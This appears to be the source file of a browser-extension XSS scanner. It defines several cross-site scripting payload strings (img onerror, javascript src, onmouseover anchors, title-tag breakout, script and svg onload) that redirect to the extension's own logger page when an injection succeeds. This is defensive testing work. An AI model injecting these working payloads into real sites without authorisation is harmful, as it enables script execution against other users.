function imgOnError(attackNumber) {
  return "<img src=a onerror=\"window.location.replace('chrome-extension://" + chrome.runtime.id + "/request_logger.html?ref=" + window.location + "&attackName=imgOnError&attackNo=" + attackNumber + "')\">"
}

function imgOnLoad(attackNumber) {
  return "<img src=\"javascript:window.location.replace('chrome-extension://" + chrome.runtime.id + "/request_logger.html?ref=" + window.location + "&attackName=imgOnLoad&attackNo=" + attackNumber + "');\">"
}

function malformedAnchor1(attackNumber) {
  return "<a onmouseover=\"javascript:window.location.replace('chrome-extension://" + chrome.runtime.id + "/request_logger.html?ref=" + window.location + "&attackName=malformedAnchor1&attackNo=" + attackNumber + "');\">XSS link - HOVER ME</a>"
}

function malformedAnchor2(attackNumber) {
  return "<a onmouseover=javascript:window.location.replace('chrome-extension://" + chrome.runtime.id + "/request_logger.html?ref=" + window.location + "&attackName=malformedAnchor2&attackNo=" + attackNumber + "');>XSS link - HOVER ME</a>"
}

function endTitleTag(attackNumber) {
  return "</TITLE><SCRIPT>alert(\"window.location.replace('chrome-extension://" + chrome.runtime.id + "/request_logger.html?ref=" + window.location + "&attackName=endTitleTag&attackNo=" + attackNumber + "')\");</SCRIPT>"
}

function inputImage(attackNumber) {
  return "</TITLE><SCRIPT>window.location.replace('chrome-extension://" + chrome.runtime.id + "/request_logger.html?ref=" + window.location + "&attackName=inputImage&attackNo=" + attackNumber + "')</SCRIPT>"
}

function basicScript(attackNumber) {
  return "<SCRIPT>window.location.replace('chrome-extension://" + chrome.runtime.id + "/request_logger.html?ref=" + window.location + "&attackName=basicScript&attackNo=" + attackNumber + "')</SCRIPT>"
}

function svgObject(attackNumber) {
  return "<svg/onload=window.location.replace('chrome-extension://" + chrome.runtime.id + "/request_logger.html?ref=" + window.location + "&attackName=svgObject&attackNo=" + attackNumber + "')>"
}

// The rest are commented out because it becomes very intensive on the browser
var XSSattacks = [
  imgOnError,
  imgOnLoad,
  malformedAnchor1,
  // malformedAnchor2,
  // endTitleTag,
  // inputImage,
  // svgObject,
  // basicScript
]
